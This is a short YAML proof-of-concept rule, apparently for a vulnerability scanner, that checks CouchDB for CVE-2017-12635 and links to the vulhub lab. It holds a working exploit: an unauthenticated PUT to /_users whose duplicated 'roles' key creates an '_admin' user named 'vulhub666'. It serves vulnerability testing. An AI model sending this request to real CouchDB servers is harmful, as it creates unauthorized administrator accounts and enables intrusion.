name: poc-yaml-couchdb-cve-2017-12635-unauth
rules:
  - method: PUT
    path: '/_users/org.couchdb.user:vulhub666'
    body: |-
      {
        "type": "user",
        "name": "vulhub666",
        "roles": ["_admin"],
        "roles": [],
        "password": "vulhub666"
      }
    follow_redirects: false 
    expression: |
      status == 201 && body.bcontains(b'ok') && body.bcontains(b'vulhub666')
detail:
  links:
    - https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635